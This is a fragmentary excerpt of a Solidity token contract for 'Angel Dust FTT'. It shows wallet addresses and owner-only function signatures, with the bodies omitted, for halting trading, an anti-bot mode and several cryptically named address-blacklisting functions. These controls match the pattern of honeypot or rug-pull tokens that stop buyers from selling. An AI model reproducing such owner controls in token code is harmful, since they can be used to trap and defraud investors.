...
// telegram : https://t.me/AngelDustFTT
...
contract AngelDust_FTT is Context, IERC20 { 
    ...
    address payable private Wallet_Marketing = payable(0x821ab53Ca91Bb7Fd89A185b25dd5d9e24A4F3AEE); 
    address payable private Wallet_Dev = payable(0xeda935a539eCA269e5d6e30c6b8fa7504FEc50de);
    ...
    string private constant _name = "Angel Dust FTT"; 
    string private constant _symbol = unicode"ADFTT"; 
    ...
    function StatusTrading(bool open) external onlyOwner {
        _open = open;
    }
    ...
    function swapTokensForBNB(uint256 tokenAmount) private {
     ...
     function SetTOP_Volume(address account) public onlyOwner {
    ...
    function turnOnfAntibotMode() public onlyOwner {
    ...
    */
    ...
    function Blakclist_antibot(address[] calldata addresses) external onlyOwner {
    ...
    function BLL(address[] calldata addresses) external onlyOwner {
    ...
    function BLL1(address addresses) external onlyOwner {
